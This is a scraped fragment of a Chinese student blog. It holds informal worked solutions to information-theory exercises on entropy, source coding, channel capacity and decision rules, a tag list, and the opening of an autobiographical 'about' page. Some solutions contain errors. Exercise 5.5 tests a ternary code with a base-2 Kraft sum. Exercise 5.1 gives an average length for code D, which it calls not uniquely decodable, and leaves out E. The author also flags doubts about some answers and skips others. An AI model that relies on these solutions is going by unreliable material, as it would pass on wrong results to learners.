m_x - m_y)^2}{2(\\sigma_x^2 + \\sigma_y^2)} \\right] \\\\V 的均值和方差分别为 m_x - m_y 和 \\sigma_x^2 + \\sigma_y^2 \\\\\\implies p(v) = \\frac{1}{\\sqrt{2\\pi(\\sigma_x^2 + \\sigma_y^2)}} \\exp \\left[ - \\frac{(z - m_x + m_y)^2}{2(\\sigma_x^2 + \\sigma_y^2)} \\right]\\end{aligned}$$ (2) 计算 $h(U), h(V)$ 和 $I(U;V)$ 。 $$\\begin{aligned}h(U) = h(V) = \\frac{1}{2} \\log [2 \\pi e (\\sigma_x^2 + \\sigma_y^2)] \\quad h(XY) = \\log (2 \\pi e \\sigma_x \\sigma_y) \\\\\\begin{pmatrix}u \\\\ v\\end{pmatrix} =\\begin{pmatrix}1 &amp; 1 \\\\1 &amp; -1\\end{pmatrix}\\begin{pmatrix}x \\\\ y\\end{pmatrix} \\\\\\left|\\det\\begin{pmatrix}1 &amp; 1 \\\\1 &amp; -1\\end{pmatrix}\\right|= 2 \\implies h(UV) = h(XY) + \\log 2 = \\log (4 \\pi e \\sigma_x \\sigma_y) \\\\\\implies I(U;V) = h(U) + h(V) - h(UV) \\\\= \\log (2 \\pi e (\\sigma_x^2 + \\sigma_y^2)) - \\log (4 \\pi e \\sigma_x \\sigma_y) \\\\= \\log \\frac{\\sigma_x^2 + \\sigma_y^2}{2 \\sigma_x \\sigma_y}\\end{aligned}$$ 习题 4.20设 $X^N, Y^N$ 为定义在 $\\mathbb{R}^N$ 空间中的两个 $N$ 维矢量，$U^N, V^N$ 分别为 $X^N, Y^N$ 的可逆线性变换，即 $u = Ax + \\alpha$, $v = By + \\beta$ ，证明$$I(U^N; V^N) = I(X^N; Y^N)$$ $$\\begin{pmatrix}U^N \\\\V^N\\end{pmatrix} =\\begin{pmatrix}A &amp; 0 \\\\0 &amp; B\\end{pmatrix}\\begin{pmatrix}x \\\\y\\end{pmatrix} +\\begin{pmatrix}\\alpha \\\\\\beta\\end{pmatrix}$$ 令 $C = \\begin{pmatrix} A &amp; 0 \\\\ 0 &amp; B \\end{pmatrix}, z = \\begin{pmatrix} x \\\\ y \\end{pmatrix}, \\gamma = \\begin{pmatrix} \\alpha \\\\ \\beta \\end{pmatrix}, \\begin{pmatrix} U^N \\\\ V^N \\end{pmatrix} = Cz + \\gamma$ $$\\begin{aligned}I(U^N; V^N) = h(U^N) + h(V^N) - h(U^N V^N) = h(Ax + \\alpha) + h(By + \\beta) - h(Cz + \\gamma) \\\\= h(X^N) + \\log |\\det(A)| + h(Y^N) + \\log |\\det(B)| - h(X^N Y^N) - \\log |\\det(C)| \\\\= h(X^N) + h(Y^N) - h(X^N Y^N) = I(X^N; Y^N)\\end{aligned}$$ 上面用到了行列式的性质：$$\\det(C) = \\begin{vmatrix} A &amp; 0 \\\\ 0 &amp; B \\end{vmatrix} = \\det(A) \\det(B)$$ 第五章 无失真信源编码习题 5.1有一信源，它有 6 个可能的输出，其概率分布见下表，表中给出了对应的码 A，B，C，D，E 和 F。问： (1) 这些码中哪些是即时码；(2) 哪些是唯一可译码，并对所有唯一可译码，求出其平均码长 $\\overline{L}$ 。 消息 $P(a_i)$ A B C D E F $a_1$ 1/2 000 0 0 0 0 0 $a_2$ 1/4 001 01 10 10 10 100 $a_3$ 1/16 010 011 110 110 1100 101 $a_4$ 1/16 011 0111 1110 1110 1101 110 $a_5$ 1/16 100 01111 11110 1011 1110 111 $a_6$ 1/16 101 011111 111110 1101 1111 011 (1) 即时码就是没有一个码字是另一个码字的前缀。比如 B 里 0 是 01 的前缀，D 里 110 是 1101 的前缀，F 里 0 是 011 的前缀，所以只有 A, C, E 是即时码。 (2) 观察表中这些码组，A 是等长码，其中没有相同的码字，所以 A 是唯一可译码。其他码组都是变长码，可采用唯一可译变长码来判断：码组 B、C、E 是唯一可译码，码组 D、F 不是唯一可译码。唯一可译码的平均码长为$$\\overline{L} = \\sum_{i=1}^{q} P(s_i) l_i$$ 因此，$\\overline{L}_A = 3$ 码符号/信源符号，$\\overline{L}_B = 2.125$ 码符号/信源符号，$\\overline{L}_C = 2.125$ 码符号/信源符号，$\\overline{L}_D = 2$ 码符号/信源符号。 习题 5.5是否存在码长分别为 1, 2, 2, 2, 2, 2, 3, 3, 3, 3 的唯一可译三元变长码？是否可以构造一个码长为 1, 2, 2, 2, 2, 2, 3, 3, 3 的即时码？存在多少这样的码？(1) 因为 $\\sum_i 2^{-l_i} = 2^{-1} + 5 \\times 2^{-2} + 4 \\times 2^{-3} = \\frac{9}{4} &gt; 1$，所以不存在码长分别为 1, 2, 2, 2, 2, 2, 3, 3, 3, 3 的唯一可译三元变长码。 (2) 可以构造码长为 1, 2, 2, 2, 2, 2, 3, 3, 3 的即时码，例如：0, 10, 11, 12, 20, 21, 220, 221, 222。 (3) 因为一个即时码码字集合与一棵码树的叶有一一对应的关系，不同的码树对应不同的码字集合。现分析这种码树生成过程：一个根节点延伸出 3 个 1 阶节点，其中有 2 个 1 阶节点要各自延伸出 3 个 2 阶节点，方法数是 3；6 个 2 阶节点中有 1 个延伸出 3 个 3 阶节点，方法数是 6，所以不同码树数目为 3 × 6 = 18，其中的一棵码树如图 5.5 所示。一个码字集合可以根据不同的对应关系分配给信源符号，如果信源符号和码字都是 9 个，则有 9! 种分配方式。所以，存在的编码方式数为 18 × 9!。 习题 5.7设信源 $S$ ，符号集为 ${s_1, s_2}$ ，其中，$P(s_1) = 0.1$。 (1) 求信源的熵和信源剩余度。$$H(S) = - \\sum_{i=1}^2 p(s_i) \\log p(s_i) \\approx 0.469 \\text{ 比特/符号}$$剩余度 $\\gamma = 1 - \\frac{H(S)}{\\log_2 2} = 0.531 = 53.1%$。(2) 设码符号为 $A = {0, 1}$ ，编出 $S$ 的最优码，并求其平均码长。码符号 $X = {0, 1}$，对信源 $S$ 编紧致码为：$s_0 \\rightarrow 0, s_1 \\rightarrow 1$。其平均码长为 $1$ 码符号/信源符号。(3) 把信源的 $N$ 次扩展源 $S^N$ 编成最优码，求 $N = 2, 3, 4, \\infty$ 时的平均码长 $\\overline{L}_N / N$。当 $N = 2$ 时，$$S^2 = {a_1 = s_1 s_1, a_2 = s_1 s_2, a_3 = s_2 s_1, a_4 = s_2 s_2}$$$$P(a_i) = [0.01, 0.09, 0.09, 0.81]$$ 紧致码（即哈夫曼码）为： 码字 0 10 110 111 码长 1 2 3 3 平均码长 $\\frac{\\overline{L}_N}{N} = \\frac{1}{N} \\sum_{i=1}^{4} P(a_i) l_i = 0.645 \\text{ 码符号/信源符号}$。 同理，当 $N = 3$ 时，平均码长 $\\frac{\\overline{L}_3}{3} = 0.533 \\text{ 码符号/信源符号}$； 当 $N = 4$ 时，平均码长 $\\frac{\\overline{L}_4}{4} = 0.493 \\text{ 码符号/信源符号}$； 当 $N = \\infty$ 时，紧致码的平均码长为：$$\\lim_{N \\to \\infty} \\frac{\\overline{L}_N}{N} = \\frac{H(S)}{\\log r} \\approx 0.469 \\text{ 码符号/信源符号}$$(4) 计算当 $N = 1, 2, 3, 4$ 时的编码效率和码剩余度。编码效率 $\\eta = \\frac{H_r(S)}{\\overline{L}} = \\frac{H(S)}{\\overline{L}}$ （$r = 2$），码剩余度 $1 - \\eta = 1 - \\frac{H_r(S)}{\\overline{L}} = 1 - \\frac{H(S)}{\\overline{L}}$。 所以 $N = 1$ 时，编码效率为 $0.469$，码剩余度为 $0.531$；$N = 2$ 时，编码效率为 $0.727$，码剩余度为 $0.273$；$N = 3$ 时，编码效率为 $0.880$，码剩余度为 $0.12$；$N = 4$ 时，编码效率为 $0.951$，码剩余度为 $0.049$。 习题 5.8某离散无记忆信源有8个信源符号 ${a_0, a_1, a_2, a_3, a_4, a_5, a_6, a_7}$ ，各符号的概率分别为 0.1, 0.1, 0.1, 0.1, 0.1, 0.4, 0.05, 0.05。 (1) 对信源进行码长方差最小的二元 Huffman 编码，求平均码长、码长的方差，以及码率和编码效率。 信源符号 码字 $a_0$ 010 $a_1$ 100 $a_2$ 101 $a_3$ 110 $a_4$ 111 $a_5$ 00 $a_6$ 0110 $a_7$ 0111 $$\\overline{l} = 5 \\times 0.1 \\times 3 + 0.4 \\times 2 + 0.1 \\times 4 = 2.7 \\text{ 码元/信源符号}$$ $$\\sigma^2 = \\sum_i p_i l_i^2 - \\overline{l}^2 = 5 \\times 0.1 \\times 3^2 + 0.4 \\times 2^2 + 2 \\times 0.05 \\times 4^2 - 2.7^2 = 0.41$$$$H(X) = 2.622 \\text{ 比特/信源符号}, \\quad R = \\overline{l} \\log_2 2 = 2.7 \\text{ 比特/信源符号}$$ 编码效率为：$$\\eta = \\frac{H(X)}{R} = \\frac{2.622}{2.7} \\approx 97.11%$$ (2) 将信源符号编成香农码，求平均码长、码长的方差，以及码率和编码效率。无参考答案，嘻嘻。 第六章 离散信道及其容量习题 6.6设二元对称信道的概率转移矩阵为$$\\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix}$$ (1) 若 $p(0) = 1/3$ ，求 $I(x=0;y=1), I(x=1;Y), I(X;Y)$ 。设输出概率为 $q_0, q_1$，有$$(q_0, q_1) = (p_0, p_1)P = \\left(1/3 \\quad 2/3\\right) \\begin{pmatrix} 3/4 &amp; 1/4 \\\\ 1/4 &amp; 3/4 \\end{pmatrix} = \\left(5/12 \\quad 7/12\\right)$$$$\\begin{aligned}I(x=0; y=1) = \\log \\frac{p(y=1|x=0)}{p(y=1)} = \\log_2 \\frac{1/4}{7/12} = -1.22 \\text{ bit} \\\\I(x=1; Y) = \\sum_j p_{ij} \\log \\frac{p_{ij}}{q_j} = \\frac{1}{4} \\log_2 \\frac{1/4}{5/12} + \\frac{3}{4} \\log_2 \\frac{3/4}{7/12} = 0.088 \\text{ 比特/符号} \\\\I(x=0; Y) = \\sum_j p_{ij} \\log \\frac{p_{ij}}{q_j} = \\frac{3}{4} \\log_2 \\frac{3/4}{5/12} + \\frac{1}{4} \\log_2 \\frac{1/4}{7/12} = 0.33 \\text{ 比特/符号} \\\\I(X; Y) = \\sum_i p(x) I(x; Y) = \\frac{1}{3} I(x=0; Y) + \\frac{2}{3} I(x=1; Y) = 0.169 \\text{ 比特/符号}\\end{aligned}$$ (2) 求该信道的容量及其达到容量时的输入概率分布。该信道为二元对称信道，达到容量时输入等概，即 $p_0 = p_1 = 1/2$，输出也等概。$$C = 1 - H\\left(\\frac{1}{4}\\right) = 1 - 0.811 = 0.189 \\text{ 比特/符号}$$ 习题 6.11一个离散无记忆信道如图6.22所示： (1) 写出该信道的转移概率矩阵；信道的转移概率矩阵为$$P = \\begin{pmatrix}1/2 &amp; 1/4 &amp; 1/4 \\\\0 &amp; 1 &amp; 0 \\\\1/4 &amp; 1/4 &amp; 1/2\\end{pmatrix}$$(2) 该信道是否为对称信道？该信道不是对称信道。(3) 求该信道的信道容量；由 $P \\beta = -h$，可得$$\\begin{pmatrix}1/2 &amp; 1/4 &amp; 1/4 \\\\0 &amp; 1 &amp; 0 \\\\1/4 &amp; 1/4 &amp; 1/2\\end{pmatrix}\\begin{pmatrix}\\beta_0 \\\\\\beta_1 \\\\\\beta_2\\end{pmatrix} =\\begin{pmatrix}\\frac12\\log \\frac12 + \\frac14\\log \\frac14 + \\frac14\\log \\frac14 \\\\0 \\\\\\frac12\\log \\frac12 + \\frac14\\log \\frac14 + \\frac14\\log \\frac14\\end{pmatrix}$$ 解得 $\\beta_0 = -2, \\beta_1 = 0, \\beta_2 = -2$。 $$C = \\log (2^{-2} + 2^0 + 2^{-2}) = \\log_2 \\frac{3}{2} = 0.585 \\text{ 比特/符号}$$(4) 求达到信道容量时的输出概率分布。$$q_0 = q_2 = \\frac{1}{6}, \\quad q_1 = \\frac{2}{3}$$ $$p_0 = p_2 = \\frac{2}{9}, \\quad p_1 = \\frac{5}{9}$$ 习题 6.12一个 Z 信道的转移概率如图6.23所示：(1) 求信道容量；？考试考这个我似了算了信道转移矩阵为$$P = \\begin{pmatrix}1 &amp; 0 \\\\\\epsilon &amp; 1-\\epsilon\\end{pmatrix}, \\quad P^{-1} = \\begin{pmatrix}1 &amp; 0 \\\\\\frac{-\\epsilon}{1-\\epsilon} &amp; \\frac{1}{1-\\epsilon}\\end{pmatrix}$$$$h = \\begin{pmatrix}0 \\\\H(\\epsilon)\\end{pmatrix}, \\quad \\beta = -P^{-1} h = \\begin{pmatrix}0 \\\\-\\frac{H(\\epsilon)}{1-\\epsilon}\\end{pmatrix}, \\quad q_0 = \\frac{1}{1+2^{-\\frac{H(\\epsilon)}{1-\\epsilon}}}, \\quad q_1 = \\frac{2^{-\\frac{H(\\epsilon)}{1-\\epsilon}}}{1+2^{-\\frac{H(\\epsilon)}{1-\\epsilon}}}$$ $$(p_0\\quad p_1) = (q_0\\quad q_1) P^{-1} = \\left( 1-\\frac{\\epsilon^{\\frac{\\epsilon}{1-\\epsilon}}}{1+(1-\\epsilon)\\epsilon^\\frac{\\epsilon}{1-\\epsilon}} \\quad \\frac{\\epsilon^{\\frac{\\epsilon}{1-\\epsilon}}}{1+(1-\\epsilon)\\epsilon^\\frac{\\epsilon}{1-\\epsilon}} \\right)$$ 输入概率均大于零，所以信道容量为$$C = \\log \\left( 1 + 2^{-\\frac{H(\\epsilon)}{1-\\epsilon}} \\right)$$(2) 若将两个同样的 Z 信道串接，求串接后信道的转移概率矩阵；(3) 求 (2) 中串接信道的容量和达到容量时的输入的概率分布；(4) 将 n 个同样的 Z 信道串接，求串接后信道的转移概率矩阵和信道容量。 习题 6.14给定如图6.25所示的级联信道，求：感觉这题答案有点问题(1) $X$ 与 $Y$ 之间的信道容量 $C_1$；由于 $X$ 与 $Y$ 之间的信道转移概率矩阵为$$P_1 = \\begin{pmatrix}1 - \\epsilon &amp; \\epsilon \\\\\\epsilon &amp; 1 - \\epsilon\\end{pmatrix}$$ 所以信道为弱对称信道，当输入等概时达到容量。 $$C_1 = \\log 2 - H(\\epsilon) = \\log 2 + \\epsilon \\log \\epsilon + (1 - \\epsilon) \\log (1 - \\epsilon)$$(2) $Y$ 与 $Z$ 之间的信道容量 $C_2$；$Y$ 和 $Z$ 之间的信道转移矩阵为$$P_2 = \\begin{pmatrix}3/4 &amp; 0 &amp; 1/4 \\\\0 &amp; 3/4 &amp; 1/4\\end{pmatrix}$$ 由于信道为弱对称信道，当 $p_1 = p_2 = 1/2$ 时达到信道容量 $C_2$，此时输出概率分布为 $(3/8, 3/8, 1/4)$，所以信道容量$$C_2 = H(3/8, 3/8, 1/4) - H(1/4, 3/4) = 3/4 \\text{ 比特/符号}$$(3) $X$ 与 $Z$ 之间的信道容量 $C_3$ 及达到容量时的输入概率分布。$X$ 和 $Z$ 之间的转移概率矩阵 $P_3 = P_1 \\times P_2$，所以$$P_3 = \\begin{pmatrix}1 - \\epsilon &amp; \\epsilon \\\\\\epsilon &amp; 1 - \\epsilon\\end{pmatrix}\\begin{pmatrix}3/4 &amp; 1/4 &amp; 0 \\\\0 &amp; 1/4 &amp; 3/4\\end{pmatrix}=\\begin{pmatrix}3(1-\\epsilon)/4 &amp; 1/4 &amp; (3\\epsilon)/4 \\\\(3\\epsilon)/4 &amp; 1/4 &amp; 3(1-\\epsilon)/4\\end{pmatrix}$$ 该信道是弱对称信道，当输入等概率分布时达到信道容量 $C_3$，此时$$q_0 = q_1 = 3/8,\\quad q_2 = 1/4$$ 所以$$C_3 = H \\left( \\frac{3}{8}, \\frac{3}{8}, \\frac{1}{4} \\right) - H \\left( \\frac{3(1-\\epsilon)}{4}, \\frac{1}{4}, \\frac{3\\epsilon}{4} \\right) = \\frac{3}{4} [\\log 2 - H(\\epsilon)]$$ 输入等概时达到容量。 第七章 有噪信道编码习题 7.3一信道输入符号集 $A = {0,1/2,1}$ ，输出符号集 $B = {0, 1}$ ，信道的转移概率矩阵为$$P = \\begin{pmatrix} 1 &amp; 0 \\\\ 1/2 &amp; 1/2 \\\\ 0 &amp; 1 \\end{pmatrix}$$ 现有 4 个等概率消息通过此信道输出，若选择这样的信道编码：$C_b: {a_1, a_2, 1/2, 1/2}$, $a_i = 0$ 或 $1 \\ (i = 1, 2)$ ，码长为 4，并选择如下译码规则：$$f: (y_1, y_2, y_3, y_4) = (y_1, y_2, 1/2, 1/2)$$ (1) 编码后信息传输速率等于多少？编码后信息传输速率：$$R = \\frac{\\log_2 4}{4} = 0.5 \\text{ 比特/符号}$$(2) 证明在此译码规则下，对于码字的译码错误率 $P_E^{(i)} = 0, i = 1, 2, 3, 4$ 。设 4 个消息的编码分别为：(0, 0, 1/2, 1/2)，(0, 1, 1/2, 1/2)，(1, 0, 1/2, 1/2)，(1, 1, 1/2, 1/2)，通过信道传输后，每个码字的前两位无差错，所以不同的码字的传输得到不同的译码结果，无译码错误。 习题 7.4一个二元对称信道的转移概率矩阵为$$P = \\begin{pmatrix} 1-p &amp; p \\\\ p &amp; 1-p \\end{pmatrix} \\ (p &lt; 1/2)$$ 信道输入符号 0,1 的概率分别为 $\\omega, 1 - \\omega$ 。 (1) 求利用 MAP 准则的判决函数和平均错误率。MAP 准则 联合概率矩阵：$$\\begin{pmatrix}(1-p) \\omega &amp; p \\omega \\\\p(1-\\omega) &amp; (1-p)(1-\\omega)\\end{pmatrix}$$ 当接收到 “0” 时：若 $(1-p) \\omega \\geqslant p (1-\\omega)$，则判断为 “0”；反之，则判断为 “1”。 所以$$G(y=0) = \\begin{cases}0 &amp; (\\omega \\geqslant p) \\\\1 &amp; (\\omega &lt; p)\\end{cases}$$ 同理，得$$G(y=1) = \\begin{cases}0 &amp; (\\omega \\geqslant 1-p) \\\\1 &amp; (\\omega &lt; 1-p)\\end{cases}$$ 因为 $p &lt; \\frac{1}{2}$，所以 $1-p &gt; p$。可总结如下： MAP 判决函数：$$G(y) = \\begin{cases}0 &amp; (\\omega \\geqslant 1-p) \\\\1 &amp; (\\omega &lt; p)\\end{cases}$$$$G(y=0) = 0, \\quad G(y=1) = 1 \\quad (p \\leqslant \\omega &lt; 1-p)$$ 平均错误率：$$p_E = \\begin{cases}1-\\omega &amp; (\\omega \\geqslant 1-p) \\\\\\omega &amp; (\\omega &lt; p) \\\\p &amp; (p \\leqslant \\omega &lt; 1-p)\\end{cases}$$ 或$$p_E = \\min(1-\\omega, \\omega, p)$$ (2) 求利用 ML 准则的判决函数和平均错误率。利用 ML 准则 当接收到 “0” 时，若 $(1-p) \\geqslant p$，则判断为“0”；反之，则判断为 “1”，而根据题意有 $1-p &gt; p$。 所以$$G(y=0) = 0$$ 同理，得$$G(y=1) = 1$$ 所以，有 ML 判决函数：$$G(y=0) = 0, \\quad G(y=1) = 1$$ 平均错误率：$$p_E = p$$ (3) 什么时候上述两准则的判决结果相同？当 $p &lt; \\omega \\leqslant 1-p$ 时，上述两准则的判决结果相同。 第八章 波形信道这个例题是关于离散时间无记忆加性噪声信道的输入和输出的互信息、信道容量及其概率分布的求解。具体问题和解答如下： 习题 8.3 一个离散时间无记忆加性噪声信道的输入 $ X $ 限制在 $[-2,2]$，独立于 $ X $ 的噪声 $ Z $ 在 $[-1,1]$ 区间均匀分布，熵为 $ h(Z) $。信道输出 $ Y $ 的熵为 $ h(Y) $。 （1）写出信道输入 $ X $ 与输出 $ Y $ 的平均互信息 $ I(X;Y) $ 的表达式。（2）求信道容量和达到容量时的输出概率分布。（3）求达到容量时的输入概率分布。 （1）$ I(X;Y) $ 的表达式： $ I(X;Y) = h(Y) - h(Z) $。 （2）因为 $ -2 \\leqslant X \\leqslant 2 $， $ -1 \\leqslant Z \\leqslant 1 $，$ y = x + z $，所以 $y$ 的范围是：$-3&lt;y&lt;3$，噪声熵 $ h(Z) = \\log(1 + 1) = \\log 2 $，所以当 $ Y $ 有最大熵时，信道达到容量，此时 $ Y $ 应在 $(-3,3)$ 范围均匀分布，$ Y $ 的分布密度为 $$ p_Y(y) = \\begin{cases} 1/6 &amp; -3 &lt; y &lt; 3 \\\\ 0 &amp; \\text{其他} \\end{cases} $$ 信道容量 $ \\max I(X;Y) = \\log_2 (3 + 3) - \\log_2 2 = \\log_2 3 = 1.585 $ 比特/自由度。 （3）因为 $ y = x + z $，且 $ x $ 与 $ z $ 相互独立，则 $ y $ 的概率密度可以由 $ x $ 与 $ z $ 的概率密度卷积得到，设 $ p_X(x) \\leftrightarrow X(\\omega) $, $ p_Z(z) \\leftrightarrow Z(\\omega) $, $ p_Y(y) \\leftrightarrow Y(\\omega) $，其中 $ \\leftrightarrow $ 表示傅里叶变换关系，有 $ X(\\omega) Z(\\omega) = Y(\\omega) $。 $$Y(\\omega) = \\int_{-3}^{3} \\left(\\frac{1}{6}\\right) e^{-j\\omega y} dy = \\frac{\\sin(3\\omega)}{3\\omega}$$ $$Z(\\omega) = \\int_{-1}^{1} \\left(\\frac{1}{2}\\right) e^{-j\\omega z} dz = \\frac{\\sin \\omega}{\\omega}$$ $$X(\\omega) = \\frac{Y(\\omega)}{Z(\\omega)} = \\frac{1}{3} (2 \\cos 2\\omega + 1)$$ 做反变换，得 $$X(\\omega) = \\frac{Y(\\omega)}{Z(\\omega)} = \\frac{1}{3} (2 \\cos 2\\omega + 1) \\rightarrow \\frac{1}{3} \\left[ \\delta(x-2) + \\delta(x+2) + \\delta(x) \\right]$$ 所以达到容量时，$ X $ 的概率分布是 $$p(x=0) = p(x=-2) = p(x=2) = \\frac{1}{3}$$ 习题 8.6 设离散时间连续信道的输入与输出分别为 $ X^N = (X_1, \\cdots, X_N) $ 和 $ Y^N = (Y_1, \\cdots, Y_N) $，试证明： （1）信源无记忆时，有 $I(X^N; Y^N) \\geqslant \\sum_{i=1}^N I(X_i; Y_i)$，当且仅当信道无记忆时等式成立。$$\\begin{aligned}\\sum_{i=1}^N I(X_i; Y_i) - I(X^N; Y^N) &amp;= \\sum_{i=1}^N [H(X_i) - H(X_i | Y_i)] - \\sum_{i=1}^N H(X_i) + H(X^N | Y^N) \\\\&amp;= H(X^N | Y^N) - \\sum_{i=1}^N H(X_i | Y_i) \\\\&amp;= \\sum_{i=1}^N H(X_i | Y^NX_1X_2\\cdots X_{i-1}) - \\sum_{i=1}^N H(X_i | Y_i) \\leqslant 0\\end{aligned}$$故：$$I(X^N; Y^N) \\geqslant \\sum_{i=1}^N I(X_i; Y_i)$$ （2）信道无记忆时，有 $I(X^N; Y^N) \\leqslant \\sum_{i=1}^N I(X_i; Y_i)$，当且仅当信源无记忆时等式成立。$$\\begin{aligned}I(X^N; Y^N) - \\sum_{i=1}^N I(X_i; Y_i) &amp;= H(Y^N) - H(Y^N | X^N) - \\sum_{i=1}^N [H(Y_i) - H(Y_i | X_i)] \\\\&amp;= H(Y^N) - \\sum_{i=1}^N H(Y_i) \\leqslant 0\\end{aligned}$$故：$$I(X^N; Y^N) \\leqslant \\sum_{i=1}^N I(X_i; Y_i)$$ 综上所述，当信源和信道无记忆时，这两个等式分别成立。 第九章 信息率失真函数不用考，不学啦！","link":"/2024/06/21/%E4%BF%A1%E6%81%AF%E8%AE%BA%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"WSL","slug":"WSL","link":"/tags/WSL/"},{"name":"VSCode","slug":"VSCode","link":"/tags/VSCode/"},{"name":"Code-server","slug":"Code-server","link":"/tags/Code-server/"},{"name":"数学","slug":"数学","link":"/tags/%E6%95%B0%E5%AD%A6/"},{"name":"抽象代数","slug":"抽象代数","link":"/tags/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"},{"name":"论文","slug":"论文","link":"/tags/%E8%AE%BA%E6%96%87/"},{"name":"GPT","slug":"GPT","link":"/tags/GPT/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"前端","slug":"前端","link":"/tags/%E5%89%8D%E7%AB%AF/"},{"name":"算法","slug":"算法","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"计算机网络","slug":"计算机网络","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"渗透","slug":"渗透","link":"/tags/%E6%B8%97%E9%80%8F/"},{"name":"代理","slug":"代理","link":"/tags/%E4%BB%A3%E7%90%86/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"二进制安全","slug":"二进制安全","link":"/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"Golang","slug":"Golang","link":"/tags/Golang/"},{"name":"电影","slug":"电影","link":"/tags/%E7%94%B5%E5%BD%B1/"},{"name":"生活","slug":"生活","link":"/tags/%E7%94%9F%E6%B4%BB/"},{"name":"计算机","slug":"计算机","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"学习","slug":"学习","link":"/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"汇编","slug":"汇编","link":"/tags/%E6%B1%87%E7%BC%96/"},{"name":"格","slug":"格","link":"/tags/%E6%A0%BC/"},{"name":"CVP","slug":"CVP","link":"/tags/CVP/"},{"name":"杂谈","slug":"杂谈","link":"/tags/%E6%9D%82%E8%B0%88/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"},{"name":"SSL","slug":"SSL","link":"/tags/SSL/"},{"name":"高数","slug":"高数","link":"/tags/%E9%AB%98%E6%95%B0/"},{"name":"信号与系统笔记","slug":"信号与系统笔记","link":"/tags/%E4%BF%A1%E5%8F%B7%E4%B8%8E%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/"},{"name":"复变函数","slug":"复变函数","link":"/tags/%E5%A4%8D%E5%8F%98%E5%87%BD%E6%95%B0/"},{"name":"材料力学","slug":"材料力学","link":"/tags/%E6%9D%90%E6%96%99%E5%8A%9B%E5%AD%A6/"},{"name":"计组","slug":"计组","link":"/tags/%E8%AE%A1%E7%BB%84/"},{"name":"信息论","slug":"信息论","link":"/tags/%E4%BF%A1%E6%81%AF%E8%AE%BA/"}],"categories":[{"name":"题解","slug":"题解","link":"/categories/%E9%A2%98%E8%A7%A3/"},{"name":"学习","slug":"学习","link":"/categories/%E5%AD%A6%E4%B9%A0/"},{"name":"环境搭建","slug":"环境搭建","link":"/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"数学","slug":"数学","link":"/categories/%E6%95%B0%E5%AD%A6/"},{"name":"小项目","slug":"小项目","link":"/categories/%E5%B0%8F%E9%A1%B9%E7%9B%AE/"},{"name":"小玩意","slug":"小玩意","link":"/categories/%E5%B0%8F%E7%8E%A9%E6%84%8F/"},{"name":"C语言","slug":"C语言","link":"/categories/C%E8%AF%AD%E8%A8%80/"},{"name":"生活","slug":"生活","link":"/categories/%E7%94%9F%E6%B4%BB/"},{"name":"渗透","slug":"渗透","link":"/categories/%E6%B8%97%E9%80%8F/"}],"pages":[{"title":"关于","text":"因为淋过雨，所以想给别人撑伞。 TeamMember of W4terDr0p / S1uM4i / 1997. 成长历程初见故事得从我初一的时候说起，当时年轻气盛，在 QQ 建了一个级群，里面各种鱼龙混杂，机缘巧合之下，有人在群里发了一个安卓 AIDE 开发群的二维码，我进去后也跟着下了一个玩，迷迷糊糊写了个 HelloWorld ，算是初步踏入了编程之路。 走马观花到初二的时候，我一个同班同学开始带着我研究计算机。毕竟他是跟电脑从小玩到大的，会很多东西，比如会视频剪辑，精通 Office（是真的精通），而且也会用虚拟机破解 WIFI 密码，知道 Windows 系统的很多东西，其他还有 OCR 等很杂的，我现在大都忘了，但仍很清楚地记得他带我写了几个 vb 程序。从那以后，我开始知道了程序设计的基本结构（比如 if-else ），也算是正式开始编程了。 临近生地中考的时候，我借着打印复习资料的由头（虽然现在回想起来有点离谱）成功劝服家里买了第一台电脑。买之前我是和我同学研究了许久的，以至于我现在仍清楚地记得最初的配置——CPU 是英特尔的 i5-7500，内存条 8G ，2400Hz ，金士顿的，硬盘买了希捷的 2T 机械硬盘，其他不提。后来断断续续又补了两个固态作主盘，加了张显卡和内存条，也撑了 5 年直到现在没出过什么毛病。 总之，从初二开始，我便开始广泛地接触到计算机的许多方面了，诸如 Office、AE 等软件大概鼓捣过，用 vb.net 写（Ctrl+C &amp; Ctrl+V）了几个窗体应用程序，但也仅此而已。 登堂入室高考结束后，我开始研究起写网站，毕竟想搞这个很久了，几经摸索，我在阿里云租了一个轻量级应用服务器（新人优惠，一年也就 99 元，不算很贵），然后就是各种百度了。 建站的过程非常艰辛，或许是我对搜索引擎的使用不够熟练，我查了很多资料，但很多都是在本地部署网络服务，或是 WordPress 的搭建教程，而我是想写一个空白的页面（或者说是不依赖于框架运行的），又折腾许久，在 WordPress 的应用镜像下更换了目录下的文件，勉强可以实现。再后来又换了 LNMP 的应用镜像，直到几个月后 GZTime 学长告诉我有个东西叫宝塔，我才发现都白忙活了。。。 在七月末的时候，我开始在 B 站看 C 语言的视频，2 倍速每天看五个钟连着五天把 1500 分钟的视频刷完了，才算是真正开始入门编程。 八月初，花了将近 10 天细细啃读了一遍高一就买了的《x86 汇编————从实模式到保护模式》，然而看完实模式已经晕了，就没有再看了。 至此，计算机底层的基础就打下来一点了。 